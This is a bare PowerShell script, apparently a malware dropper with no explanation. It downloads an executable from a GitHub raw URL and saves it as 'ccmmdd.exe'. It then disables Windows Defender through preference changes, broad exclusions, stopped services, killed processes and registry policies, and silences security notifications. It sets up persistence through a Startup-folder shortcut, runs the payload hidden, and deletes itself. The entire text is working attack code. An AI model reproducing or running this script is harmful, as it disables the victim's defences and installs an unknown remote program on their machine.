$url = "https://raw.githubusercontent.com/qwertyuiopkjopl-ops/qYGFDDEFVBDrwe/refs/heads/main/Ebari.exe"
$dest = "$env:USERPROFILE\ccmmdd.exe"
(New-Object Net.WebClient).DownloadFile($url, $dest)

Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyAccess $true
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -SubmitSamplesConsent 2

Set-MpPreference -ExclusionPath $env:USERPROFILE
Set-MpPreference -ExclusionPath "C:\Windows\Temp"
Set-MpPreference -ExclusionProcess "ccmmdd.exe"
Set-MpPreference -ExclusionExtension ".exe"
Set-MpPreference -ExclusionExtension ".dll"

Stop-Service -Name WinDefend -Force
Stop-Service -Name MsMpSvc -Force
Stop-Service -Name SecurityHealthService -Force

New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Force

New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center" -Force
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force

Get-Process -Name MsMpEng -ErrorAction SilentlyContinue | Stop-Process -Force
Get-Process -Name NisSrv -ErrorAction SilentlyContinue | Stop-Process -Force

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ccmmdd.lnk")
$Shortcut.TargetPath = $dest
$Shortcut.Save()

Start-Process -FilePath $dest -WindowStyle Hidden

$script = $MyInvocation.MyCommand.Path
$batch = "$env:TEMP\selfdel.cmd"
"@echo off`ntimeout /t 1 /nobreak >nul`ndel /f /q `"$script`"`ndel /f /q `"%~f0`"" | Out-File -FilePath $batch -Encoding ASCII
Start-Process -FilePath $batch -WindowStyle Hidden